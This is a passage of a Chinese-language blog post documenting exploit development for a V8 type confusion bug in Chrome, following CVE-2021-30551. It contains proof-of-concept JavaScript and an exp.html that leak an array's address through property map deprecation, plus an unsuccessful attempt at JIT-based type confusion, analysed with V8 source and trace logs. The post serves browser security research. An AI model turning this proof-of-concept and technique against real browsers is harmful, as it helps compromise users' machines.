</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#75715e">// main.js
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">import</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">as</span> <span style="color:#a6e22e">cvs</span> <span style="color:#a6e22e">from</span> <span style="color:#e6db74">&#39;./module/conversion.mjs&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">s1</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">createElement</span>(<span style="color:#e6db74">&#39;p&#39;</span>).<span style="color:#a6e22e">style</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">v1</span> <span style="color:#f92672">=</span> { <span style="color:#a6e22e">toString</span><span style="color:#f92672">:</span> () =&gt; {<span style="color:#a6e22e">s1</span>.<span style="color:#a6e22e">prop</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>} };
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">s1</span>.<span style="color:#a6e22e">prop</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">v1</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">s2</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">createElement</span>(<span style="color:#e6db74">&#39;p&#39;</span>).<span style="color:#a6e22e">style</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">v2</span> <span style="color:#f92672">=</span> [<span style="color:#ae81ff">1.1</span>, <span style="color:#ae81ff">1.2</span>, <span style="color:#ae81ff">1.3</span>];
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">v2</span>.<span style="color:#a6e22e">toString</span> <span style="color:#f92672">=</span>  () =&gt; {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">s2</span>.<span style="color:#a6e22e">prop</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">s1</span>.<span style="color:#a6e22e">prop</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1.1</span>
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">alert</span>(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">s2</span>.<span style="color:#a6e22e">prop</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">v2</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">`0x</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">cvs</span>.<span style="color:#a6e22e">ftou</span>(<span style="color:#a6e22e">s2</span>.<span style="color:#a6e22e">prop</span>).<span style="color:#a6e22e">toString</span>(<span style="color:#ae81ff">16</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#75715e">&lt;!--exp.html--&gt;</span>
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
</span></span><span style="display:flex;"><span>	&lt;<span style="color:#f92672">body</span>&gt;
</span></span><span style="display:flex;"><span>		&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;module&#34;</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;./main.js&#34;</span>&gt;
</span></span><span style="display:flex;"><span>		&lt;/<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span>		PWN:)
</span></span><span style="display:flex;"><span>	&lt;/<span style="color:#f92672">body</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
</span></span></code></pre></div><hr>
<p>⚠️提示：浏览器原生支持的模块的用法参考 <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Modules">MDN</a>，也可以用Typescript，Babel 提供的模块机制。</p>
<hr>
<p>如下图所示，读取到的结果和调试器中看到的 v2 的内容一致。</p>
<p>![[Pasted image 20221205000128.png]]</p>
<p>光能泄漏一个数组 Elements 的地址还是不够的，还需要进一步的转化获得一个修改什么数据的能力。先借鉴 CVE-2021-30551 POC 中的思路，优化一下上面的利用代码，引入一个新的属性 deprecate 来专门触发 map 废弃，这样 prop 就可以支持更多的数据类型之间的混淆了，代码修改如下：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#75715e">// main.js
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">import</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">as</span> <span style="color:#a6e22e">cvs</span> <span style="color:#a6e22e">from</span> <span style="color:#e6db74">&#39;./module/conversion.mjs&#39;</span>                  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">smi_value</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;                                            
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">double_value</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1.1</span>;                                       
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">s1</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">createElement</span>(<span style="color:#e6db74">&#39;p&#39;</span>).<span style="color:#a6e22e">style</span>;                     
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">v1</span> <span style="color:#f92672">=</span> {                                                      
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">toString</span><span style="color:#f92672">:</span> () =&gt; {
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// 2. 创建一个包含 double(HeapNumber) 类型的 confuzion 属性的新 map                                             
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#a6e22e">s1</span>.<span style="color:#a6e22e">confuzion</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">double_value</span>;                                
</span></span><span style="display:flex;"><span>	}                                                             
</span></span><span style="display:flex;"><span>};                                                              
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// 1. 创建一个包含 SMI类型的 deprecate 属性的新 map 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">s1</span>.<span style="color:#a6e22e">deprecate</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">smi_value</span>;                    
</span></span><span style="display:flex;"><span><span style="color:#75715e">// 3. 创建一个包含 object 类型的 confuzion 属性的新 map
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">s1</span>.<span style="color:#a6e22e">confuzion</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">v1</span>;                                              
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">s2</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">createElement</span>(<span style="color:#e6db74">&#39;p&#39;</span>).<span style="color:#a6e22e">style</span>;                     
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">v2</span> <span style="color:#f92672">=</span> [<span style="color:#ae81ff">1.1</span>, <span style="color:#ae81ff">1.2</span>, <span style="color:#ae81ff">1.3</span>];                                       
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">v2</span>.<span style="color:#a6e22e">toString</span> <span style="color:#f92672">=</span>  () =&gt; {      
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 5. 搜索到 2 中创建好的 map
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">s2</span>.<span style="color:#a6e22e">confuzion</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">double_value</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 6. deprecate 属性的类型从 SMI 泛化到了 HeapNumber，创建新 map 替代 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// 1. 2. 3. 创建的 map，并且把旧 map 被标记为 deprecate                                  
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">s1</span>.<span style="color:#a6e22e">deprecate</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">double_value</span>;                                  
</span></span><span style="display:flex;"><span>};                                                              
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// 4.搜索到 1. 中创建好的 map
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">s2</span>.<span style="color:#a6e22e">deprecate</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">smi_value</span>;     
</span></span><span style="display:flex;"><span><span style="color:#75715e">// 7. 发现 s2 目前的 map 已经被标记为 deprecated，先更新到 6. 中创建的新 map，然后又以 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// confuzion 属性名，搜索新 map，还是搜索到 6. 中创建的新 map，也是 s1 目前在用的 map
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">s2</span>.<span style="color:#a6e22e">confuzion</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">v2</span>;                                              
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">`0x</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">cvs</span>.<span style="color:#a6e22e">ftou</span>(<span style="color:#a6e22e">s2</span>.<span style="color:#a6e22e">confuzion</span>).<span style="color:#a6e22e">toString</span>(<span style="color:#ae81ff">16</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);              
</span></span></code></pre></div><p>再来分析一下目前都可以控制哪些东西，s1.confuzion 的类型是完全可控的，s2.confuzion 我认为是不太可控的，为了触发漏洞 s2.confuzion 一定要是个包含 toString 函数的对象，这意味着它一定要是 HeapObject 类型的。</p>
<hr>
<p>⚠️ 提示：这块只是我自己的理解，不一定对，也许有什么我不知道的特性让非 HeapObject 类型的值也可以有自定义的 toString 回调。</p>
<hr>
<p>之前分析过 CVE-2021-30551 的思路是，让 s2.confuzion 是一个浮点数，s1.confuzion 是一个数组，就可以把写入 s2.confuzion 的浮点数，当作数组的地址使用。但这个漏洞 s2.confuzion 一定要是 HeapObject，我就想到是不是可以选择浮点数数组，然后让 s1.confuzion 是对象数组。回顾一下上面的 WriteField 函数，对象的写入由 FastPropertyAtPut 函数完成，就是把对象的指针存储到属性中，这个赋值操作并不能直接触发类型混淆，需要结合上 JIT 编译生成的代码才行。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> JSObject<span style="color:#f92672">::</span>FastPropertyAtPut(FieldIndex index, Object value,
</span></span><span style="display:flex;"><span>                                 WriteBarrierMode mode) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (index.is_inobject()) {
</span></span><span style="display:flex;"><span>    RawFastInobjectPropertyAtPut(index, value, mode);
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    DCHECK_EQ(UPDATE_WRITE_BARRIER, mode);
</span></span><span style="display:flex;"><span>    property_array().set(index.outobject_array_index(), value);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> JSObject<span style="color:#f92672">::</span>RawFastInobjectPropertyAtPut(FieldIndex index, Object value,
</span></span><span style="display:flex;"><span>                                            WriteBarrierMode mode) {
</span></span><span style="display:flex;"><span>  DCHECK(index.is_inobject());
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> offset <span style="color:#f92672">=</span> index.offset();
</span></span><span style="display:flex;"><span>  RELAXED_WRITE_FIELD(<span style="color:#f92672">*</span><span style="color:#66d9ef">this</span>, offset, value);
</span></span><span style="display:flex;"><span>  CONDITIONAL_WRITE_BARRIER(<span style="color:#f92672">*</span><span style="color:#66d9ef">this</span>, offset, value, mode);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>基本思路是定义一个读取参数对象的 confusion[0] 的函数，然后用 s1 触发这个函数的 JIT 编译，之后以 s2 为参数调用 JIT 编译好的函数，如果没有触发 deoptimize 的话，s2.confusion 就会被当作对象数组使用，而实际上它是一个浮点数数组，数组里存储的内容都是可控的。</p>
<p>先用下面的代码测试下：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">import</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">as</span> <span style="color:#a6e22e">cvs</span> <span style="color:#a6e22e">from</span> <span style="color:#e6db74">&#39;./module/conversion.mjs&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">smi_value</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">double_value</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1.1</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">obj_arr</span> <span style="color:#f92672">=</span> [{}, {}, {}];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">s1</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">createElement</span>(<span style="color:#e6db74">&#39;p&#39;</span>).<span style="color:#a6e22e">style</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">v1</span> <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">toString</span><span style="color:#f92672">:</span> () =&gt; {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">s1</span>.<span style="color:#a6e22e">confuzion</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">obj_arr</span>;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">s1</span>.<span style="color:#a6e22e">deprecate</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">smi_value</span>;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">s1</span>.<span style="color:#a6e22e">confuzion</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">v1</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">s2</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">createElement</span>(<span style="color:#e6db74">&#39;p&#39;</span>).<span style="color:#a6e22e">style</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">v2</span> <span style="color:#f92672">=</span> [<span style="color:#ae81ff">1.1</span>, <span style="color:#ae81ff">1.2</span>, <span style="color:#ae81ff">1.3</span>];
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">v2</span>.<span style="color:#a6e22e">toString</span> <span style="color:#f92672">=</span>  () =&gt; {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">s2</span>.<span style="color:#a6e22e">confuzion</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">obj_arr</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">s1</span>.<span style="color:#a6e22e">deprecate</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">double_value</span>;
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">s2</span>.<span style="color:#a6e22e">deprecate</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">smi_value</span>;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">s2</span>.<span style="color:#a6e22e">confuzion</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">v2</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">jit</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">obj</span>) =&gt; {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">obj</span>.<span style="color:#a6e22e">confuzion</span>[<span style="color:#ae81ff">0</span>];
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">20000</span>; <span style="color:#f92672">++</span><span style="color:#a6e22e">i</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">jit</span>(<span style="color:#a6e22e">s1</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">alert</span>(<span style="color:#a6e22e">jit</span>(<span style="color:#a6e22e">s2</span>));
</span></span></code></pre></div><p>不出意外的结果是不行，alert 弹窗输出了正确的浮点值 1.1，下面我分析一下为什么不行。我对 turbofan 的整个编译过程虽然不是一无所知吧，但是可以说是一窍不通。所以我采用的分析方案就是抓取 trace log 和 CVE-2021-30551 的进行对比，找到它们的区别。</p>
<p>抓取 trace log 需要指定命令行 <code>./chrome.exe --no-sandbox --enable-logging=stderr --js-flags=&quot;--trace-turbo&quot;</code>。</p>
<p>简单对比之后我发现，主要的区别在 V8.TFInlining 阶段。jit 函数很简单，访问对象的属性 confuzion 以及访问数组的 [0] 元素两个操作，分别对应 IR 图中的 JSLoadNamed 和 JSLoadProperty 两个节点。对于 CVE-2021-30551 的 EXP，这两个节点在 V8.TFInlining 阶段满足了优化的条件，都被替换成了更底层的内存加载操作 LoadFiled、LoadElement。而对于本次的 EXP JSLoadNamed 节点没有满足优化条件，仍然保持是 JSLoadNamed，这个区别就使得直接导致类型混淆的 CheckMaps 优化的条件没有被满足，编译生成的代码在访问 confuzion[0] 还是会检查 confuzion 的 map 是否满足条件，不会触发类型混淆。</p>
<p>![[Pasted image 20221213233338.png]]</p>
<p>![[Pasted image 20221213233416.png]]</p>
<hr>
<p>⚠️ 提示：如果不理解这里，需要回忆一下 CVE-2021-30551 的 利用过程，有关键的一步是 JSLoadNamed 和 JSLoadElements 两个节点 Inline 后得到的两个 ChecksMaps 被优化编译器认为是重复的，第二个在优化过程中被删掉了。如果第二个 CheckMaps 一直保留的话，程序运行过程中，就能正确的识别出 obj.confuzion 的类型与预期不匹配，走入 deoptimize 的流程，避免类型混淆的发生。详情可以参考<a href="2022-04-30-CVE-2021-30551">我之前对 CVE-2021-30551 的分析</a>。</p>
<hr>
<p>继续分析 JSLoadNamed 没有被 Inline 的原因，调试过后发现，是由于下面这个函数的条件没满足。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">bool</span> <span style="color:#a6e22e">CanInlinePropertyAccess</span>(MapRef map, AccessMode access_mode) {
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// We can inline property access to prototypes of all primitives, except
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// the special Oddball ones that have no wrapper counterparts (i.e. Null,
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// Undefined and TheHole).
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// We can only inline accesses to dictionary mode holders if the access is a
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// load and the holder is a prototype. The latter ensures a 1:1
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// relationship between the map and the object (and therefore the property
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// dictionary).
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  STATIC_ASSERT(ODDBALL_TYPE <span style="color:#f92672">==</span> LAST_PRIMITIVE_HEAP_OBJECT_TYPE);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (map.object()<span style="color:#f92672">-&gt;</span>IsBooleanMap()) <span style="color:#66d9ef">return</span> true;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (map.instance_type() <span style="color:#f92672">&lt;</span> LAST_PRIMITIVE_HEAP_OBJECT_TYPE) <span style="color:#66d9ef">return</span> true;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (map.object()<span style="color:#f92672">-&gt;</span>IsJSObjectMap()) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (map.is_dictionary_map()) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>V8_DICT_PROPERTY_CONST_TRACKING_BOOL) <span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> access_mode <span style="color:#f92672">==</span> AccessMode<span style="color:#f92672">::</span>kLoad <span style="color:#f92672">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>             map.object()<span style="color:#f92672">-&gt;</span>is_prototype_map();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">!</span>map.object()<span style="color:#f92672">-&gt;</span>has_named_interceptor() <span style="color:#f92672">&amp;&amp;</span> <span style="color:#75715e">// &lt;&lt;&lt; 走到这里因为目标对象有 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>												    <span style="color:#75715e">// interceptor 所以没满足条件
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>           <span style="color:#75715e">// TODO(verwaest): Allowlist contexts to which we have access.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>           <span style="color:#f92672">!</span>map.is_access_check_needed();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> false;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>要让 has_named_interceptor 这个条件成为 false 看起里不太可能，但是函数里还有一个 is_dictionary_map 的判断条件还是很可能满足了，遗憾的是 V8_DICT_PROPERTY_CONST_TRACKING_BOOL 这个值默认为 FALSE，也就是说满足了 is_dictionary_map 的条件，函数的整体返回值还是 false。</p>
<p>再试试其他思路，虽然不能 Inline 掉 JSLoadNamed，我们能不能用其他手段引入类似的 CheckMaps 节点呢？</p>
<h2 id="参考">参考</h2>
<ul>
<li><a href="https://sensepost.com/blog/2020/intro-to-chromes-v8-from-an-exploit-development-angle/">https://sensepost.com/blog/2020/intro-to-chromes-v8-from-an-exploit-development-angle/</a></li>
<li><a href="https://gts3.org/2019/turbofan-BCE-exploit.html">https://gts3.org/2019/turbofan-BCE-exploit.html</a></li>
</ul>
<ul class="pa0">
  
</ul>
<div class="mt6 instapaper_ignoref">
      
      
      </div>
    </div>

    <aside class="w-30-l mt6-l">




</aside>

  </article>

    </main>
    <footer class="bg-black bottom-0 w-100 pa3" role="contentinfo">
  <div class="flex justify-between">
  <a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="http://localhost:1313/" >
    &copy;  My New Hugo Site 2024 
  </a>
    <div><div class="ananke-socials"></div>
</div>
  </div>
</footer>

  </body>
</html>
